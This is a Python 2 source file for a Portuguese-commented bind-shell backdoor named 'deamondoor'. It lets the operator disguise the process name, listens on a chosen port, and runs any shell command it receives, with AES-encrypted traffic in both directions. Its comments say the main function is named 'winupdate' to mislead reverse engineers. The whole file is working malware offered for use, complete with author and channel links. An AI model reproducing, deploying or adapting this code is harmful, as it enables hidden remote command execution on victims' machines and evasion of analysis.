#!/usr/bin/python2
# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from Crypto import Random
import socket
import base64
import os
import subprocess
import optparse
import sys
import setproctitle
from random import choice
import sys
from os import system
#cores
cyanClaro="\033[1;36m"
vermelho = '\033[31;1m'
verde = '\033[32;1m'
azul = '\033[34;1m'
normal = '\033[0;0m'
purpleClaro= '\033[1;35m'
amarelo= '\033[1;33m'
ciano='\033[46m'
magenta='\033[45m'
normal = '\033[0;0m'
#variaveis
system("clear")
__criador__ ="darkcode0x00"
version = 0.2
def winupdate(): #chama bind no sistema , enganar engenharia reversa com confuncao de modulo por isso win-update e nao def backdor
#####################################
	dsa = (azul+'''
	
	██████╗  █████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗      ██╗    ██╗██╗███╗   ██╗
	██╔══██╗██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║      ██║    ██║██║████╗  ██║
	██║  ██║███████║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║█████╗██║ █╗ ██║██║██╔██╗ ██║
	██║  ██║██╔══██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║╚════╝██║███╗██║██║██║╚██╗██║
	██████╔╝██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║      ╚███╔███╔╝██║██║ ╚████║
	╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝       ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝
	
	'''+normal)#banner
	title = raw_input(purpleClaro+'coloque o nome do prcesso: '+normal) # processo local
	print("o sua backdoor esta rodando com o nome :%s" %title)

	setproctitle.setproctitle(title)

	EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
	DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

	# Chave secreta aleatoria (tanto o cliente como o servidor devem corresponder a esta chave)
	from random import choice
	import sys
	from os import system

	def gera_senha(tamanho):
			catacteres = '0123456789abcdefghijlmnopqrstuwvxyzABCDEFGHIJKLMNOPQRSTUWVXYZ!@#$%^&*()_+}|]\[]\'/?<>'
			senha = ''
			for char in range(tamanho):
					senha += choice(catacteres)
			return (senha)

	gera = gera_senha(32) # gerador da chave aes 32 versao 2 ira vim com suporta utf8 para acento nas palavras
	secret = gera
	iv = Random.new().read(AES.block_size)

	# criando o ob cipher
	cipher = AES.new(secret, AES.MODE_CFB, iv)

	# Parse argumento da linha de comando
	# Geralmente qualquer saida seria escondida no lado do servidor (vitima)
	parser = optparse.OptionParser("sintaxe: python3 server.py -p <port>")
	parser.add_option('-p', dest='port', type = 'int', help = 'port')
	(options, args) = parser.parse_args()
	if (options.port == None):
		print (parser.usage)
		sys.exit()
	else:
		port = options.port

	# listando clientes
	system("clear")
	c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	c.bind(('0.0.0.0', port))
	print(dsa)
	__info__    =vermelho+"autor            =>" +azul + "[darkcode0x00]\n" +verde+"canal do youtube => "+amarelo+"https://www.youtube.com/channel/UC4d_mJv4uhppA-hCdFODWJw?view_as=subscriber\n"+verde+"facebook         => "+amarelo + "https://www.facebook.com/gthfdhgfdswtyumnbvcx"+verde+"\nfacebook-page    => "+amarelo+"https://www.facebook.com/darckode0x00\n"+verde+"site             =>"+amarelo+" https://www.darkcode0x00.com\n"+verde+"git              => "+amarelo+"https://github.com/darkcode357/deamondoor"+normal
	print(__info__)
	print(vermelho+"#"*60)
	print(vermelho+"#"*22+verde+"info"+vermelho+"#"*34)
	print(vermelho+"#"*60)
	print(verde+"version                => "+amarelo+str(version))
	print(verde+"senha da backdoor(AES) => "+amarelo + secret)
	print(verde+"host:0.0.0.0           => "+amarelo+"port:%d" % port)
	c.listen(10)
	try:
		s, a = c.accept()
		print(a)
		s.send(EncodeAES(cipher, 'voce esta conectado' + secret))
	except KeyboardInterrupt:
		print ("saida ")
	while True:
		print(vermelho+"comandos format(aes)"+normal)
		try:
			data = s.recv(900000)
			#print("comando de: %d",a) v2 para lista mult-client
			print("=> "+cyanClaro+data)
		# decrypt data
			decrypted = DecodeAES(cipher, data)

		#Verifique se ha "saida" pelo atacante
			if decrypted == "saida":
				break
		# execute command
			proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			stdoutput = str(proc.stdout.read() + proc.stderr.read() + secret)

		# criptografar saida
			encrypted = EncodeAES(cipher, stdoutput)

		# enviar saida criptografada
			s.send(encrypted)
		except KeyboardInterrupt:
			print("erro ctr c ")
			print("coloque backdoor sai")


	s.close()
	sys.exit()
winupdate()